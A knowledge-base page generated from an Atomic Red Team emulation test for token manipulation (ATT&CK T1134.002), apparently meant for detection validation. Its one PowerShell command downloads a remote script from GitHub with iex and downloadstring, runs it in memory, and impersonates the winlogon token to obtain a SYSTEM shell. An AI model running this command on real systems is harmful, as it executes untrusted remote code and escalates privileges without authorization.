---
atomic_guid: "ccf4ac39-ec93-42be-9035-90e2f26bcd92"
title: "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1134.002"
attack_technique_name: "Create Process with Token"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "ccf4ac39-ec93-42be-9035-90e2f26bcd92"
  - "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn

## ATT&CK Mapping

- [[kb/attack/techniques/T1134-access_token_manipulation#^t1134002-create-process-with-token|T1134.002: Create Process with Token]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1134.002/T1134.002.yaml)
